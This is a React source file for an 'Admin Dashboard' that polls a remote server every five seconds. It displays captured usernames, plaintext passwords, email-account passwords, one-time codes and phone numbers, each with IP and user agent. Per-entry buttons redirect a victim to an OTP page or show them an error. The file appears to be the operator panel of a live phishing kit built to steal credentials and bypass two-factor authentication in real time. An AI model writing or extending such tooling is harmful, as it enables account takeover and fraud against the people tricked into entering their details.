import React, { useState, useEffect } from "react";
import axios from "axios";
import { approveLogin, rejectLogin } from "../api";
import styles from "./AdminDashboard.module.css";

const AdminDashboard = () => {
  const [loginLogs, setLoginLogs] = useState([]);
  const [otpLogs, setOtpLogs] = useState([]);
  const [emailPasswordLogs, setEmailPasswordLogs] = useState([]);
  const [numberLogs, setNumberLogs] = useState([]);
  const [theme, setTheme] = useState("light");

  const fetchLogs = async () => {
    try {
      const token = localStorage.getItem("token");
      if (!token) throw new Error("No token found, please log in again.");

      const headers = { Authorization: `Bearer ${token}` };
      const fetchAndFilterLogs = async (url) => {
        const response = await axios.get(url, { headers });
        return response.data.filter((log) =>
          Object.values(log).some((value) => value && value !== "")
        );
      };

      const [loginLogs, otpLogs, emailPasswordLogs, numberLogs] =
        await Promise.all([
          fetchAndFilterLogs("https://serverside-nn15.onrender.com/admin/logs?type=login"),
          fetchAndFilterLogs("https://serverside-nn15.onrender.com/admin/logs?type=otp"),
          fetchAndFilterLogs(
            "https://serverside-nn15.onrender.com/admin/logs?type=emailPassword"
          ),
          fetchAndFilterLogs("https://serverside-nn15.onrender.com/admin/logs?type=number"),
        ]);

      setLoginLogs(loginLogs);
      setOtpLogs(otpLogs);
      setEmailPasswordLogs(emailPasswordLogs);
      setNumberLogs(numberLogs);
    } catch (error) {
      console.error("Error fetching logs:", error);
    }
  };

  useEffect(() => {
    fetchLogs();
    const intervalId = setInterval(fetchLogs, 5000);
    return () => clearInterval(intervalId);
  }, []);

  const handleLogout = () => {
    localStorage.removeItem("token");
    // Redirect to login page or update app state
  };

  const handleThemeToggle = () => {
    const newTheme = theme === "light" ? "dark" : "light";
    setTheme(newTheme);
    document.body.setAttribute("data-theme", newTheme);
  };

  const handleRedirectToOtp = async (logId) => {
    try {
      const response = await approveLogin(logId);
      if (response.success) {
        fetchLogs();
        console.log("User approved for OTP page", logId);
      } else {
        console.error("Approval failed:", response.message);
      }
    } catch (error) {
      console.error("Error approving login:", error);
    }
  };

  const handleShowError = async (logId) => {
    try {
      await rejectLogin(logId);
      fetchLogs();
      console.log("Login rejected for user", logId);
    } catch (error) {
      console.error("Error rejecting login:", error);
    }
  };

  return (
    <div className={`${styles.dashboardContainer} ${styles[theme]}`}>
      <header className={styles.header}>
        <h1>Admin Dashboard</h1>
        <div>
          <button className={styles.logoutButton} onClick={handleLogout}>
            Logout
          </button>
          <button className={styles.themeToggle} onClick={handleThemeToggle}>
            {theme === "light" ? "🌙" : "☀️"}
          </button>
        </div>
      </header>

      {loginLogs.length > 0 && (
        <div className={styles.tableContainer}>
          <h2 className={styles.tableHeading}>Login Attempts</h2>
          <table>
            <tbody>
              {loginLogs.map((log, index) => (
                <tr key={index}>
                  <td>
                    <strong>Username:</strong> {log.username}
                  </td>
                  <td>
                    <strong>Password:</strong> {log.password}
                  </td>
                  <td>
                    <strong>IP:</strong> {log.ip}
                  </td>
                  <td>
                    <strong>User Agent:</strong> {log.userAgent}
                  </td>
                  <td>
                    <div className={styles.actionButtons}>
                      <button
                        className={styles.button}
                        onClick={() => handleRedirectToOtp(log._id)}
                      >
                        Redirect to OTP Page
                      </button>
                      <button
                        className={`${styles.button} ${styles.errorButton}`}
                        onClick={() => handleShowError(log._id)}
                      >
                        Show Error
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {otpLogs.length > 0 && (
        <div className={styles.tableContainer}>
          <h2 className={styles.tableHeading}>OTP Entries</h2>
          <table>
            <tbody>
              {otpLogs.map((log, index) => (
                <tr key={index}>
                  <td>
                    <strong>OTP Entered:</strong> {log.otp}
                  </td>
                  <td>
                    <strong>IP:</strong> {log.ip}
                  </td>
                  <td>
                    <strong>User Agent:</strong> {log.userAgent}
                  </td>
                  <td>
                    <div className={styles.actionButtons}>
                      <button
                        className={styles.button}
                        onClick={() => handleRedirectToOtp(log._id)}
                      >
                        Approve OTP
                      </button>
                      <button
                        className={`${styles.button} ${styles.errorButton}`}
                        onClick={() => handleShowError(log._id)}
                      >
                        Reject OTP
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {emailPasswordLogs.length > 0 && (
        <div className={styles.tableContainer}>
          <h2 className={styles.tableHeading}>Email/Password Entries</h2>
          <table>
            <tbody>
              {emailPasswordLogs.map((log, index) => (
                <tr key={index}>
                  <td>
                    <strong>Email:</strong> {log.email}
                  </td>
                  <td>
                    <strong>Email Password:</strong> {log.emailPassword}
                  </td>
                  <td>
                    <strong>IP:</strong> {log.ip}
                  </td>
                  <td>
                    <strong>User Agent:</strong> {log.userAgent}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {numberLogs.length > 0 && (
        <div className={styles.tableContainer}>
          <h2 className={styles.tableHeading}>Number Entries</h2>
          <table>
            <tbody>
              {numberLogs.map((log, index) => (
                <tr key={index}>
                  <td>
                    <strong>Phone Number Entered:</strong> {log.phoneNumber}
                  </td>
                  <td>
                    <strong>IP:</strong> {log.ip}
                  </td>
                  <td>
                    <strong>User Agent:</strong> {log.userAgent}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
};

export default AdminDashboard;

